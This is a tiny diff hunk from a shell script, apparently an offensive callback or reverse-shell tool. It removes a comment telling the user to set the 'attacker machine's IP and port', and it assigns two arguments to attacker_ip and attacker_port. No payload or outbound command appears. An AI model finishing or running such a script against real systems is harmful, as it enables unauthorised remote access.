@@ -10,7 +10,6 @@ if [ "$#" -ne 2 ]; then
     exit 1
 fi
 
-# Set your attacker machine's IP and port here
 attacker_ip=$1
 attacker_port=$2
 
